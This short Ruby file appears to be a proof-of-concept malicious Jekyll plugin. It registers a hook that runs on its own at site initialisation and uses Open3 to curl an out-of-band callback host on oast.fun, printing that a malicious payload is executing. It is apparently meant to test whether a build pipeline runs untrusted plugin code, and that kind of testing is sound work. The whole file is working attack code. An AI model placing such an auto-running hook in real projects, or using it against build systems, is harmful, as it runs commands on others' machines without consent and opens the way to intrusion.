# _plugins/evil.rb
require 'open3'

Jekyll::Hooks.register :site, :after_init do |site|
  puts "Executing malicious payload..."
  #  DNSLog
  stdout, stderr, status = Open3.capture3("curl http://bqiehrpshxqkxlzvdxgc32wowysc7once.oast.fun")
  puts "Payload executed."
end
